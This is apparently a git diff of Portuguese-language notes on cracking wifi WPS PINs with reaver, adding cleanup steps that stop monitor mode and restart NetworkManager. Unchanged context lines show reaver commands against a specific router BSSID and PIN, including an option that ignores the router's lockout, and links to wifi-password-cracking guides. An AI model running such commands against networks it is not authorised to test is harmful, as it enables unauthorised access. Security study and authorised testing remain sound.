@@ -31,6 +31,13 @@ reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -p 19018324  -vv
     # --ignore-locks ignora lock do roteador, que pode ainda estar respondendo aos PIN enviados
 reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -p 19018324  -vv --ignore-locks
 
+## Gerenciador de conexões
+    # Pare o modo monitor na interface wlan0mon, voltando a ter wlan0 em modo managed
+airmon-ng stop wlan0mon
+
+    ## Inicie o gerenciador de conexões
+NetworkManager
+
 ## Good links
 http://null-byte.wonderhowto.com/how-to/hack-wpa-wifi-passwords-by-cracking-wps-pin-0132542/
 http://www.wirelessdomination.com/how-to-crack-wpa2-wifi-password-using-reaver-wpa2/
